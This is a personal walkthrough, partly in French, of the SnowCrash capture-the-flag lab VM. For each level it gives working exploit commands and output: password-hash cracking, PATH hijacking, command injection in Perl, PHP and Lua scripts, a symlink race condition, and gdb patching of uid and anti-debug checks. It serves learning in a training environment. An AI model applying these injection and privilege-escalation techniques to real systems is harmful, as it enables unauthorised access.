# SNOWCRASH:

## ⚡ Flag
## Prerequis:
- virtualbox debian
- changer le NAT par un bridge adaptater pour se co en ssh sur la vm (virtual box settings de la vm)

## Level 00:

- on veut choper le mdp du user flag00 afin de s'y connecter et pouvoir y lancer la cmd getflag
- On trouve deux fichiers 'john' dans lesauel sont stockes une string
- Tente d'utiliser cette string en tant que mdp => fail
- Il faut déchiffrer le mdp avec 'décodecesar' et prendre le mdp le plus probable (sur les 26 possibles) => nottohardhere
- Se connecter:

```bash
level00@SnowCrash:~$ find / -name * -user flag00 2> /dev/null
/usr/sbin/john
/rofs/usr/sbin/john
level00@SnowCrash:~$ cat /rofs/usr/sbin/john
cdiiddwpgswtgt
level00@SnowCrash:~$ su flag00
Password:
Dont forget to launch getflag !
flag00@SnowCrash:~$ getflag
Check flag.Here is your token : x24ti5gi3x0ol2eh4esiuxias
```

## Level 01:

- `find / -user flag01 2> /dev/null`
- nada
- `grep flag /etc/password`
- rangement c'est username:[h du passwrd ou path vers le passwrd]:userid:groupid
- on trouve un hash pour le mdp du user flag01
- logiciel pour hacker hashage google 'how to reverse hash' => john the reaper
- cant `apt install` sur la machine car pas les droits donc on va utiliser `scp` pour copier coller en ssh
=> Soit on scp le fichier /etc/password chez nous pour decoder le hash qui y est stocke
=> Soit on scp john the reaper dans la vm pour y decoder le mdp

Chez nous:
```
sudo apt install john
scp -o IdentitiesOnly=yes -P 4242 level01@192.168.1.50:/etc/passwd /tmp/snow/
cd .tmp/snow
john passwd
john passwd --show
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
```

Sur VM
```
su flag01
Password:
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```


## Level 02
```
ls -l
total 12
----r--r-- 1 flag02 level02 8302 Aug 30  2015 level02.pcap
```

- What's .pcap => fichier de capture de sniffing d'échange de packets
- .pcap s'ouvre avec un soft type: tcpdump, cloudshark ou wireshark
- Il faut trouver les bonnes options (tcpdump / wireshark / cloudshark) pour afficher les infos correctement et pouvoir chopper un potentiel echange de login:password
  - WARNING: On doit pouvoir afficher les signaux afin de déterminer si l'utiisateur a effacé ou non des caractères

```
scp -o IdentitiesOnly=yes -P 4242 level02@192.168.1.50:level02.pcap /tmp/snow/
sudo tcpdump -r level02.pcap
chmod 777 level02.pcap
```

- Install wireshark, open file, select last packet and right click follow stream. The display as HEX
- 7f means DELETE
```
000000B9  66  f
000000BA  74  t
000000BB  5f  _
000000BC  77  w
000000BD  61  a
000000BE  6e  n
000000BF  64  d
000000C0  72  r
000000C1  7f  .
000000C2  7f  .
000000C3  7f  .
000000C4  4e  N
000000C5  44  D
000000C6  52  R
000000C7  65  e
000000C8  6c  l
000000C9  7f  .
000000CA  4c  L
000000CB  30  0
000000CC  4c  L
000000CD  0d  .
```

=> `ft_waNDReL0L`

su flag02
getflag
kooda2puivaav1idi4f57q8iq

```
su flag02
Password: ft_waNDReL0L
Don't forget to launch getflag !
getflag
Check flag.Here is your token : kooda2puivaav1idi4f57q8iq
su level03
Password: kooda2puivaav1idi4f57q8iq
```

## Level03

- On observe un binaire avec des sticky rights que l'on pas pouvoir exploiter
- `strings level03` histoire de voir les printable dedans
=> On trouve entre autre un "/usr/bin/env echo exploit me"
- On pense pouvoir creer un executable 'echo' et remplacer la variable d'env 'PATH' par le chemin vers notre executable
- On ne peut pas creer de fichiers dans le home de level03 => on utilise /var/crash car le dossier n'est pas exclusif aux droits roots

```sh
strings ./level03 | grep "Exploit me"
```

```
level03@SnowCrash:~$ ls -l /var
total 0
drwxr-xr-x 2 root root       3 Apr 19  2012 backups
drwxr-xr-x 1 root root      60 Aug 30  2015 cache
drwxrwsrwt 2 root whoopsie   3 Mar 12  2016 crash
drwxr-xr-x 1 root root     200 Nov 20 12:23 lib
drwxrwsr-x 2 root staff      3 Apr 19  2012 local
lrwxrwxrwx 1 root root       9 Aug 29  2015 lock -> /run/lock
drwxr-xr-x 1 root root     320 Nov 20 12:24 log
drwxrwsr-x 1 root mail      60 Mar  5  2016 mail
drwxr-xr-x 2 root root       3 Aug 29  2015 opt
lrwxrwxrwx 1 root root       4 Mar 12  2016 run -> /run
drwxr-xr-x 5 root root      70 Aug 29  2015 spool
d-wx-wx-wx 1 root root      40 Mar  5  2016 tmp
drwxr-xr-x 1 root root     100 Nov 20 12:23 www
```

- On veut modifier le $PATH
`echo $PATH`
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
- On export notre nouveau $PATH vers notre futur custom echo
`export PATH=/var/crash:$PATH`
`echo $PATH`
/var/crash:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

- On créer notre custom echo
```
echo "getflag > /var/crash/flag" > /var/crash/echo
chmod +x /var/crash/echo
```

- On execute le binaire level03 qui va lancer notre custom echo
```./level03
cat /var/crash/flag
```
- GG:
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

## Level 04:

- Meme principe que le Level03
```
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
level04@SnowCrash:~$ cat level04.pl
```

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

- .pl est une extension pour du script pearl
## Resolution
 * This file execute itself when doing `curl localhost:4747/level04.pl/`
 * And if the url has a query with a parameter 'x' it will print it.
 * As the text is between backticks and is a shell command we can use it at our advantage
 * `echo $y 2>&1` can become `echo Whatever && ourcommand 2>&1`
 * The last thing to do will be to encrypt spaces and & characters for urls
 * `curl localhost:4747/level04.pl/?x=yoo%3Bgetflag`

curl localhost:4747/level04.pl/?x=yoo%3Bgetflag
yoo
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

## Level05

- On cherche les fichiers du user Level05
```
find / -name level05 2>&-
/var/mail/level05
```

- On trouve un script cron qui se lance une minute sur deux
```
cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

- On regarde le contenu du script `cat /usr/sbin/openarenaserver`
```sh
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

- Ce script execute tous les scripts presents dans /opt/openarenaserver/, on y créer donc notre script bash pour executer la commande getflag

```
cat /var/crash/flag05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```



## Level06

- Same as usual
```
ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
cat level06.php
```


```php
#!/usr/bin/php
<?php
function y($m) {
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}
function x($y, $z) {
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>

```

```sh
echo "[x {\${system(getflag)}}]" > /var/crash/level06
./level06 /var/crash/level06 xxx
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```


`echo '[x {${system(getflag)}}]' > /tmp/lol; ./level06 /tmp/lol lol`
- On peut se og avec `wiok45aaoguiboiki2tuin6ub`

## Level07

- `ls -la`
level07

- `strings`
RAS

- `objdump -D level07`


08048514 <main>:
 8048514:	55                   	push   %ebp
 8048515:	89 e5                	mov    %esp,%ebp
 8048517:	83 e4 f0             	and    $0xfffffff0,%esp
 804851a:	83 ec 20             	sub    $0x20,%esp
 804851d:	e8 ce fe ff ff       	call   80483f0 <getegid@plt>
 8048522:	89 44 24 18          	mov    %eax,0x18(%esp)
 8048526:	e8 b5 fe ff ff       	call   80483e0 <geteuid@plt>
 804852b:	89 44 24 1c          	mov    %eax,0x1c(%esp)
 804852f:	8b 44 24 18          	mov    0x18(%esp),%eax
 8048533:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048537:	8b 44 24 18          	mov    0x18(%esp),%eax
 804853b:	89 44 24 04          	mov    %eax,0x4(%esp)
 804853f:	8b 44 24 18          	mov    0x18(%esp),%eax
 8048543:	89 04 24             	mov    %eax,(%esp)
 8048546:	e8 05 ff ff ff       	call   8048450 <setresgid@plt>
 804854b:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 804854f:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048553:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048557:	89 44 24 04          	mov    %eax,0x4(%esp)
 804855b:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 804855f:	89 04 24             	mov    %eax,(%esp)
 8048562:	e8 69 fe ff ff       	call   80483d0 <setresuid@plt>
 8048567:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
 804856e:	00
 804856f:	c7 04 24 80 86 04 08 	movl   $0x8048680,(%esp)
 8048576:	e8 85 fe ff ff       	call   8048400 <getenv@plt>
 804857b:	89 44 24 08          	mov    %eax,0x8(%esp)
 804857f:	c7 44 24 04 88 86 04 	movl   $0x8048688,0x4(%esp)
 8048586:	08
 8048587:	8d 44 24 14          	lea    0x14(%esp),%eax
 804858b:	89 04 24             	mov    %eax,(%esp)
 804858e:	e8 ad fe ff ff       	call   8048440 <asprintf@plt>
 8048593:	8b 44 24 14          	mov    0x14(%esp),%eax
 8048597:	89 04 24             	mov    %eax,(%esp)
 804859a:	e8 71 fe ff ff       	call   8048410 <system@plt>
 804859f:	c9                   	leave
 80485a0:	c3                   	ret
 80485a1:	90                   	nop
 80485a2:	90                   	nop
 80485a3:	90                   	nop
 80485a4:	90                   	nop
 80485a5:	90                   	nop
 80485a6:	90                   	nop
 80485a7:	90                   	nop
 80485a8:	90                   	nop
 80485a9:	90                   	nop
 80485aa:	90                   	nop
 80485ab:	90                   	nop
 80485ac:	90                   	nop
 80485ad:	90                   	nop
 80485ae:	90                   	nop
 80485af:	90                   	nop

- On repère la fonction asprintf qui semble print le nom du fichier
- On voit un getenv

- On repère un appelle de variable d'env "LOGNAME"
`ltrace ./level07`
result:
```
__libc_start_main(0x8048514, 1, 0xbffff6f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                 = 2007
geteuid()                                                 = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)       = 0
getenv("LOGNAME")                                         = "level07"
asprintf(0xbffff644, 0x8048688, 0xbfffff28, 0xb7e5ee55, 0xb7fed280) = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                    = 0
+++ exited (status 0) +++
```

- On veut réécrire LOGENV afin d'influer sur la comande echo
`strings ./level07 | grep %`
result:
/bin/echo %s

```bash
export LOGNAME="\`getflag\`"
./level07
```
result:
`Check flag.Here is your token : fiumuikeil55xe9cu4dood66h`


## Level08

`ls -l .`
result:
```
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```
- `cat token `
cat: token: Permission denied

- ON VEUT AFFICHER TOKEN

- `./level08 `
./level08 [file to read]

- `./level08 token`
You may not access 'token'

- `objdump -D level08`
result:
```
08048554 <main>:
 8048554:	55                   	push   %ebp
 8048555:	89 e5                	mov    %esp,%ebp
 8048557:	83 e4 f0             	and    $0xfffffff0,%esp
 804855a:	81 ec 30 04 00 00    	sub    $0x430,%esp
 8048560:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048563:	89 44 24 1c          	mov    %eax,0x1c(%esp)
 8048567:	8b 45 10             	mov    0x10(%ebp),%eax
 804856a:	89 44 24 18          	mov    %eax,0x18(%esp)
 804856e:	65 a1 14 00 00 00    	mov    %gs:0x14,%eax
 8048574:	89 84 24 2c 04 00 00 	mov    %eax,0x42c(%esp)
 804857b:	31 c0                	xor    %eax,%eax
 804857d:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
 8048581:	75 23                	jne    80485a6 <main+0x52>
 8048583:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048587:	8b 10                	mov    (%eax),%edx
 8048589:	b8 80 87 04 08       	mov    $0x8048780,%eax
 804858e:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048592:	89 04 24             	mov    %eax,(%esp)
 8048595:	e8 86 fe ff ff       	call   8048420 <printf@plt>
 804859a:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80485a1:	e8 ba fe ff ff       	call   8048460 <exit@plt>
 80485a6:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80485aa:	83 c0 04             	add    $0x4,%eax
 80485ad:	8b 00                	mov    (%eax),%eax
 80485af:	c7 44 24 04 93 87 04 	movl   $0x8048793,0x4(%esp)
 80485b6:	08
 80485b7:	89 04 24             	mov    %eax,(%esp)
 80485ba:	e8 41 fe ff ff       	call   8048400 <strstr@plt>
 80485bf:	85 c0                	test   %eax,%eax
 80485c1:	74 26                	je     80485e9 <main+0x95>
 80485c3:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80485c7:	83 c0 04             	add    $0x4,%eax
 80485ca:	8b 10                	mov    (%eax),%edx
 80485cc:	b8 99 87 04 08       	mov    $0x8048799,%eax
 80485d1:	89 54 24 04          	mov    %edx,0x4(%esp)
 80485d5:	89 04 24             	mov    %eax,(%esp)
 80485d8:	e8 43 fe ff ff       	call   8048420 <printf@plt>
 80485dd:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 80485e4:	e8 77 fe ff ff       	call   8048460 <exit@plt>
 80485e9:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 80485ed:	83 c0 04             	add    $0x4,%eax
 80485f0:	8b 00                	mov    (%eax),%eax
 80485f2:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
 80485f9:	00
 80485fa:	89 04 24             	mov    %eax,(%esp)
 80485fd:	e8 6e fe ff ff       	call   8048470 <open@plt>
 8048602:	89 44 24 24          	mov    %eax,0x24(%esp)
 8048606:	83 7c 24 24 ff       	cmpl   $0xffffffff,0x24(%esp)
 804860b:	75 21                	jne    804862e <main+0xda>
 804860d:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048611:	83 c0 04             	add    $0x4,%eax
 8048614:	8b 00                	mov    (%eax),%eax
 8048616:	89 44 24 08          	mov    %eax,0x8(%esp)
 804861a:	c7 44 24 04 b2 87 04 	movl   $0x80487b2,0x4(%esp)
 8048621:	08
 8048622:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048629:	e8 12 fe ff ff       	call   8048440 <err@plt>
 804862e:	c7 44 24 08 00 04 00 	movl   $0x400,0x8(%esp)
 8048635:	00
 8048636:	8d 44 24 2c          	lea    0x2c(%esp),%eax
 804863a:	89 44 24 04          	mov    %eax,0x4(%esp)
 804863e:	8b 44 24 24          	mov    0x24(%esp),%eax
 8048642:	89 04 24             	mov    %eax,(%esp)
 8048645:	e8 c6 fd ff ff       	call   8048410 <read@plt>
 804864a:	89 44 24 28          	mov    %eax,0x28(%esp)
 804864e:	83 7c 24 28 ff       	cmpl   $0xffffffff,0x28(%esp)
 8048653:	75 1c                	jne    8048671 <main+0x11d>
 8048655:	8b 44 24 24          	mov    0x24(%esp),%eax
 8048659:	89 44 24 08          	mov    %eax,0x8(%esp)
 804865d:	c7 44 24 04 c4 87 04 	movl   $0x80487c4,0x4(%esp)
 8048664:	08
 8048665:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 804866c:	e8 cf fd ff ff       	call   8048440 <err@plt>
 8048671:	8b 44 24 28          	mov    0x28(%esp),%eax
 8048675:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048679:	8d 44 24 2c          	lea    0x2c(%esp),%eax
 804867d:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048681:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048688:	e8 03 fe ff ff       	call   8048490 <write@plt>
 804868d:	8b 94 24 2c 04 00 00 	mov    0x42c(%esp),%edx
 8048694:	65 33 15 14 00 00 00 	xor    %gs:0x14,%edx
 804869b:	74 05                	je     80486a2 <main+0x14e>
 804869d:	e8 8e fd ff ff       	call   8048430 <__stack_chk_fail@plt>
 80486a2:	c9                   	leave
 80486a3:	c3                   	ret
 80486a4:	90                   	nop
 80486a5:	90                   	nop
 80486a6:	90                   	nop
 80486a7:	90                   	nop
 80486a8:	90                   	nop
 80486a9:	90                   	nop
 80486aa:	90                   	nop
 80486ab:	90                   	nop
 80486ac:	90                   	nop
 80486ad:	90                   	nop
 80486ae:	90                   	nop
 80486af:	90                   	nop
```

`ltrace ./level08 token`
result:
```
__libc_start_main(0x8048554, 2, 0xbffff6e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                  = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)              = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```


```
ln -s /home/user/level08/token /var/crash/yooo
./level08 /var/crash/yooo
```
result:
`quif5eloekouj29ke0vouxean`


```
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```


## Level09
- `ls -l`
result:
total 12
```
-rwsr-sr-x 1 flag09 level09 7640 Mar  5  2016 level09
----r--r-- 1 flag09 level09   26 Mar  5  2016 token
```

- ont tente `ltrace ./level09`
result:
```
__libc_start_main(0x80487ce, 1, 0xbffff6e4, 0x8048aa0, 0x8048b10 <unfinished ...>
ptrace(0, 0, 1, 0, 0xb7e2fe38)                            = -1
puts("You should not reverse this"You should not reverse this
)                       = 28
+++ exited (status 1) +++
```

- ltrace utilise ptrace - dans linux il ne peut y avoir qu'un seul programme qui en suit un autre - pour s'en protéger, tu peux t'auto suivre


- `./level09`
You need to provied only one arg.

- `./level09 aaaaaaaaa`
abcdefghi
 - `./level09 0000000000000000000000000000000000`
0123456789:;<=>?@ABCDEFGHIJKLMNOPQ

- On suppose que level09 encoe une string en incrémentant chaque caractère de sa position dans la string

- `cat token`
f4kmm6p|=�p�n��DB�Du{��

- token semble avoir été généré par level09, si on reverse son encodage, on peut trovuer le token

- `hexdump -C token`
00000000  66 34 6b 6d 6d 36 70 7c  3d 82 7f 70 82 6e 83 82  |f4kmm6p|=..p.n..|
00000010  44 42 83 44 75 7b 7f 8c  89 0a                    |DB.Du{....|
0000001a

```python
my_str = "66 34 6b 6d 6d 36 70 7c 3d 82 7f 70 82 6e 83 82 44 42 83 44 75 7b 7f 8c 89".split(" ")

for i, c in enumerate(my_str):
    print(chr(int(c, 16) - i), end="")
```
f3iji1ju5yuevaus41q1afiuq%

```
su flag09
Password:
Don't forget to launch getflag !
flag09@SnowCrash:~$ getflag
Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
```

## Level10

- `ls -l`
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token

- `ltrace ./level10`
__libc_start_main(0x80486d4, 1, 0xbffff6e4, 0x8048970, 0x80489e0 <unfinished ...>
printf("%s file host\n\tsends file to ho"..., "./level10"./level10 file host
	sends file to host if you have access to it
) = 65
exit(1 <unfinished ...>
+++ exited (status 1) +++

- Meme soucis que l'exo precedent, cant ltrace

- `./level10 token`
./level10 file host
	sends file to host if you have access to it

```
ltrace ./level10 /var/crash/test 0.0.0.0

ltrace ./level10 /var/crash/test 0.0.0.0
__libc_start_main(0x80486d4, 3, 0xbffff6d4, 0x8048970, 0x80489e0 <unfinished ...>
access("/var/crash/test", 4)                              = 0
printf("Connecting to %s:6969 .. ", "0.0.0.0")            = 30
fflush(0xb7fd1a20Connecting to 0.0.0.0:6969 .. )                                        = 0
socket(2, 1, 0)                                           = 3
inet_addr("0.0.0.0")                                      = NULL
htons(6969, 1, 0, 0, 0)                                   = 14619
connect(3, 0xbffff61c, 16, 0, 0)                          = 0
write(3, ".*( )*.\n", 8)                                  = 8
printf("Connected!\nSending file .. "Connected!
)                    = 27
fflush(0xb7fd1a20Sending file .. )                                        = 0
open("/var/crash/test", 0, 010)                           = 4
read(4, "yooooo\n", 4096)                                 = 7
write(3, "yooooo\n", 7)                                   = 7
puts("wrote file!"wrote file!
)                                       = 12
+++ exited (status 12) +++

```

The permission check happens before the sending. We exploit this race condition by changing the file by a symlink to the token rly fast and hope the check is on our file and then the send is the symlink


```bash
while ((1))
> do
> touch /var/crash/tmp
> rm /var/crash/tmp
> ln -s /home/user/level10/token /var/crash/tmp
> rm /var/crash/tmp
> done
```

```bash
while ((1))
do ./level10 /var/crash/tmp 0.0.0.0
done
```

- WE GET `woupa2yuojeeaaed06riuj63c`
```bash
level10@SnowCrash:~$ su flag10
Password:
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```




## level 11

`cat level11.lua`
```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

So we insert a string into popen which executes arbitrary code (lol).
we transform `"echo "..pass.." | sha1sum", "r"` into
`"echo 'lol'; getflag > /var/crash/flag11; echo 'lol' | sha1sum", "r"`
and we get the flag.
`fa6v5ateaw21peobuub8ipe6s`


## lvel 12

```perl
#!/usr/bin/env perl

use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

Egrep executes file with a name matching the pattern
We put the command to extract the flag into a file and get the egrep to excecute that file.
the filename goes through a transform that CAPITALISES the name, hence the capital 'HAKERMAN.SH' name and the '/*/HAKERMAN.sh' as '/tmp/HAKERMAN.SH' would be converted to '/TMP/HAKERMAN.SH'

```
echo "getflag > /tmp/myprecious" > /tmp/HAKERMAN.SH
chmod +x /tmp/HAKERMAN.SH
curl '127.0.0.1:4646?x="`/*/HAKERMAN.SH`"'
cat /tmp/myprecious
g1qKMiRpXf53AWhDaU7FEkczr
```

# level13


USE

https://github.com/longld/peda


```
objdump -D level13
```

```
0804858c <main>:
 804858c:	55                   	push   %ebp
 804858d:	89 e5                	mov    %esp,%ebp
 804858f:	83 e4 f0             	and    $0xfffffff0,%esp
 8048592:	83 ec 10             	sub    $0x10,%esp
 8048595:	e8 e6 fd ff ff       	call   8048380 <getuid@plt>
 804859a:	3d 92 10 00 00       	cmp    $0x1092,%eax       <------ HERE
 804859f:	74 2a                	je     80485cb <main+0x3f>
 80485a1:	e8 da fd ff ff       	call   8048380 <getuid@plt>
 80485a6:	ba c8 86 04 08       	mov    $0x80486c8,%edx
 80485ab:	c7 44 24 08 92 10 00 	movl   $0x1092,0x8(%esp)
 80485b2:	00
 80485b3:	89 44 24 04          	mov    %eax
```

```
gdb level13
gdb-peda$ b *0x0804859a
Breakpoint 1 at 0x804859a
gdb-peda$ r
Starting program: /tmp/snow/level13
[----------------------------------registers-----------------------------------]
EAX: 0x3e8
EBX: 0x0
ECX: 0x387a0294
EDX: 0xffffce74 --> 0x0
ESI: 0xf7f9b000 --> 0x1d7d8c
EDI: 0x0
EBP: 0xffffce48 --> 0x0
ESP: 0xffffce30 --> 0xf7fe5970 (push   ebp)
EIP: 0x804859a (<main+14>:      cmp    eax,0x1092)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804858f <main+3>:    and    esp,0xfffffff0
   0x8048592 <main+6>:      sub    esp,0x10
   0x8048595 <main+9>:   call   0x8048380 <getuid@plt>
=> 0x804859a <main+14>:  cmp    eax,0x1092
   0x804859f <main+19>:    je     0x80485cb <main+63>
   0x80485a1 <main+21>:    call   0x8048380 <getuid@plt>
   0x80485a6 <main+26>:       mov    edx,0x80486c8
   0x80485ab <main+31>:       mov    DWORD PTR [esp+0x8],0x1092
[------------------------------------stack-------------------------------------]
0000| 0xffffce30 --> 0xf7fe5970 (push   ebp)
0004| 0xffffce34 --> 0x0
0008| 0xffffce38 --> 0x80485f9 (<__libc_csu_init+9>:  add    ebx,0x19fb)
0012| 0xffffce3c --> 0x0
0016| 0xffffce40 --> 0xf7f9b000 --> 0x1d7d8c
0020| 0xffffce44 --> 0xf7f9b000 --> 0x1d7d8c
0024| 0xffffce48 --> 0x0
0028| 0xffffce4c --> 0xf7ddbfa1 (<__libc_start_main+241>:     add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804859a in main ()
gdb-peda$ print $eax=4242
$1 = 0x1092
gdb-peda$ s

[----------------------------------registers-----------------------------------]
EAX: 0x1092
EBX: 0x0
ECX: 0x387a0294
EDX: 0xffffce74 --> 0x0
ESI: 0xf7f9b000 --> 0x1d7d8c
EDI: 0x0
EBP: 0xffffce48 --> 0x0
ESP: 0xffffce30 --> 0xf7fe5970 (push   ebp)
EIP: 0x804859f (<main+19>:      je     0x80485cb <main+63>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048592 <main+6>:    sub    esp,0x10
   0x8048595 <main+9>:   call   0x8048380 <getuid@plt>
   0x804859a <main+14>:  cmp    eax,0x1092
=> 0x804859f <main+19>:  je     0x80485cb <main+63>
 | 0x80485a1 <main+21>:    call   0x8048380 <getuid@plt>
 | 0x80485a6 <main+26>:       mov    edx,0x80486c8
 | 0x80485ab <main+31>:       mov    DWORD PTR [esp+0x8],0x1092
 | 0x80485b3 <main+39>:       mov    DWORD PTR [esp+0x4],eax
 |->   0x80485cb <main+63>:        mov    DWORD PTR [esp],0x80486ef
       0x80485d2 <main+70>:     call   0x8048474 <ft_des>
       0x80485d7 <main+75>:     mov    edx,0x8048709
       0x80485dc <main+80>:     mov    DWORD PTR [esp+0x4],eax
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0xffffce30 --> 0xf7fe5970 (push   ebp)
0004| 0xffffce34 --> 0x0
0008| 0xffffce38 --> 0x80485f9 (<__libc_csu_init+9>:  add    ebx,0x19fb)
0012| 0xffffce3c --> 0x0
0016| 0xffffce40 --> 0xf7f9b000 --> 0x1d7d8c
0020| 0xffffce44 --> 0xf7f9b000 --> 0x1d7d8c
0024| 0xffffce48 --> 0x0
0028| 0xffffce4c --> 0xf7ddbfa1 (<__libc_start_main+241>:     add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0804859f in main ()
gdb-peda$ continue
Continuing.
your token is 2A31L79asukciNyi8uppkEuSx
[Inferior 1 (process 23856) exited with code 050]
Warning: not running
gdb-peda$
```

2A31L79asukciNyi8uppkEuSx

# Level 14

scp -r -o IdentitiesOnly=yes -P 4242 ~/peda level14@192.168.1.50:/var/crash/

```
gdb /bin/getflag
#breakpoint at ptrace to break trace detection
set the return eax to 0 (no error)
breakpoint at getuid
set return to 3014 (flag14 uid)
continue to finish
flex
```
7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ